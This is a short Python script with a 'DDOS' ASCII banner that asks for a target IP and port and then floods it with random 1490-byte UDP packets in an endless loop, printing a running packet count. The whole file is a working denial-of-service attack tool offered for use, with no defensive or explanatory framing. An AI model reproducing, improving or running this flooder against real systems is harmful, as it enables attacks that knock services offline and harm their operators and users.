#!/usr/bin/python3.xx
#codename: Kahairul
import os, socket, random, argparse  #import moduls

os.system('clear') #clear screen

# set colors
class colors(object):
    p='\033[0;35m'       # Purple
    c='\033[0;36m'         # Cyan
    w='\033[0;37m'      #white
    co='\033[0m'        #end color


#Banner
class Banner(colors):

    print(f'''
 __      __ 
/  \    /  |
\   \/\/   /
 \        /  
  \__/\  /  {colors.c}DDOS{colors.co}
       \/ 
    ''')

class Main(Banner):

    def __init__(self, ip, port):
        self.ip = ip
        self.port = port

    def ddos(self): 
        send = 0
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(1490)
        while(True):
            sock.sendto(bytes,(self.ip,self.port))
            send = send + 1
            print("sent {} packets to {} through port {}".format(send,self.ip,self.port))



if __name__ == '__main__':
    ip = input('[*]Enter your Ip: ')
    port = int(input('[*]Enter your port: '))
    Attack = Main(ip, port)
    Attack.ddos()
    